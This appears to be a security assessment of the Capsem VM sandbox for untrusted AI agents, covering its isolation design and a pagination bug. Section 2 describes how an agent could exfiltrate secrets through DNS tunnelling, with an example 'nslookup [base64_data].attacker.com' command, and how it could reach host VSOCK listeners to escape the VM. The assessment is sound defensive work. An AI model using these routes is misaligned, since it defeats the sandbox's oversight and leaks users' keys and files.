# Capsem VM Sandbox Security Assessment

This document provides a comprehensive security and functional evaluation of the **Capsem** VM sandbox environment.

---

## 1. Sandbox Architecture & Hardening Overview

Capsem implements a robust, multi-layered guest-host isolation architecture designed specifically to run untrusted AI agents safely. Below is a breakdown of the security controls observed:

```mermaid
graph TD
    subgraph Host ["Host Machine"]
        HostProxy["Host MITM Proxy (Enforces Domain Allowlists)"]
        HostResolver["Host DNS Resolver"]
    end
    subgraph Guest ["Capsem Guest VM (Debian Bookworm)"]
        Agent["AI Agent / Shell (root)"]
        Iptables["iptables REDIRECT Rules"]
        DNSProxy["capsem-dns-proxy (1053)"]
        NetProxy["capsem-net-proxy (10443 / 10080)"]
        Workspace["/root (virtiofs)"]
        RootFS["/ (Overlayfs on immutable EROFS)"]
    end

    Agent -->|Any packet to non-local IP| Dummy0["dummy0 interface (Dropped)"]
    Agent -->|DNS query (53)| Iptables
    Agent -->|HTTP/HTTPS (80/443)| Iptables
    
    Iptables -->|Redirects TCP/UDP 53| DNSProxy
    Iptables -->|Redirects TCP 80/443| NetProxy
    
    DNSProxy -->|VSOCK Port 5001| HostResolver
    NetProxy -->|VSOCK Port 5002| HostProxy
```

### Key Hardening Features

| Component | Mechanism | Security Benefit |
| :--- | :--- | :--- |
| **Filesystem Isolation** | EROFS + Overlayfs | The base root filesystem (`/`) is an immutable, read-only block device. Guest writes are redirected to an ephemeral `tmpfs` overlay that is completely discarded on reboot. The user workspace is mounted separately under `/root` via `virtiofs`. |
| **Network Isolation** | Air-gapped Routing | The VM lacks physical/virtual NICs. The only network interfaces are `lo` (loopback) and `dummy0`. The default route points to `dummy0`, preventing raw TCP/UDP outbound sockets from reaching the host network. |
| **Controlled Proxying** | Transparent Intercept | `iptables` nat rules intercept DNS (`53`), HTTP (`80`), and HTTPS (`443`) and redirect them to local proxies (`capsem-dns-proxy` / `capsem-net-proxy`). These proxies bridge traffic over `VSOCK` to host-side brokers that inspect and enforce access control policies. |
| **TLS Interception** | Custodian CA | Outbound HTTPS is intercepted by the proxy, terminated locally using a guest-trusted root CA (`Capsem CA`), and inspected before forwarding. |
| **Privilege Hardening** | Zero Setuid/Setgid | No binaries on the rootfs have `setuid`/`setgid` bits enabled, eliminating standard guest privilege-escalation routes. |
| **Kernel Hardening** | Custom Configuration | Custom Linux Kernel 7.x compiled with:<ul><li>`CONFIG_MODULES=n` (preventing kernel module loading)</li><li>`CONFIG_DEVMEM=n` and `CONFIG_DEVPORT=n` (no direct RAM/IO port access)</li><li>`CONFIG_KALLSYMS=n` (hiding kernel symbol tables)</li><li>Cmdline hardening flags: `init_on_alloc=1`, `slab_nomerge`, `page_alloc.shuffle=1`</li></ul> |

---

## 2. Identified Security Gaps & Weaknesses

While the sandbox is highly secure compared to standard container options, the following security gaps exist:

### A. Outbound DNS Exfiltration Vector (High Risk)
> [!WARNING]
> **DNS Tunneling Bypass**: The `capsem-dns-proxy` resolves arbitrary internet domains. It is not restricted to the HTTP/HTTPS allowlist.
- **Vulnerability**: Any guest process can query custom subdomains of an attacker-controlled domain (e.g. `nslookup [base64_data].attacker.com`). Because the DNS proxy forwards the request to the host resolver (which resolves it recursively over the internet), the attacker's authoritative DNS server will receive the encoded data.
- **Impact**: AI agents can exfiltrate sensitive data (API keys, workspace files, environment tokens) even if HTTP/HTTPS access is fully restricted to secure allowlisted domains.

### B. Direct VSOCK Access (Medium/Low Risk)
- **Vulnerability**: The guest VM exposes `/dev/vsock` with read-write permissions to the `root` user. Because the agent processes run as `root` (UID 0), the agent can directly open raw VSOCK sockets (`AF_VSOCK`) and connect to host ports (such as `5000`, `5001`, `5002`, `5006`).
- **Impact**: Any vulnerability in the host-side VSOCK listeners (like the MCP server relay or network proxy) could be directly exploited by the agent to escape the VM container.

---

## 3. Identified Functional & Management Bugs

Our self-diagnostics suite (`capsem-doctor`) failed **15 tests** due to a functional bug in the MCP communication layer:

### A. MCP Tool Response Pagination Bug
> [!CAUTION]
> **JSON Decode Failure**: Large tool outputs break guest-side JSON parsing.
- **Bug**: The `capsem-mcp-server` has a strict pagination limit (5000 characters). When a tool response exceeds this limit, the server prepends a text formatting header:
  ```text
  Content length: <total_length>
  Showing: 0..5000
  Use start_index=5000 to continue.
  
  <raw_json_data>
  ```
- **Why it breaks**: Guest-side python scripts (such as the `snapshots` command-line utility and `test_mcp.py` test suite) call `json.loads()` on the raw stdout. Since the output starts with the text header rather than `{`, it immediately crashes with a `JSONDecodeError`.
- **Root Cause in Workspace**: The `/root` directory contains massive cache and virtualenv folders (e.g., `.cache/ms-playwright-go` containing browser binaries and `.venv` containing package libraries). The `snapshots` tool records *all* changes relative to the boot image. Since these cache directories are not ignored (no exclusion rules exist), the snapshot JSON payloads routinely grow to 50KB+, triggering the pagination header and crashing the VM snapshot management system.

---

## 4. Summary Verdict

> [!IMPORTANT]
> **Verdict: Highly secure sandbox, but vulnerable to DNS exfiltration and prone to state-management crashes.**
> 
> Capsem offers excellent isolation for CPU, memory, and direct TCP/UDP socket connections. However, the system must block or filter DNS lookups to non-allowlisted domains to prevent data exfiltration. Additionally, a patch is required in the guest-side `snapshots` CLI and the host-side `capsem-mcp-server` to resolve the pagination bug and prevent denial-of-service in workspace management.
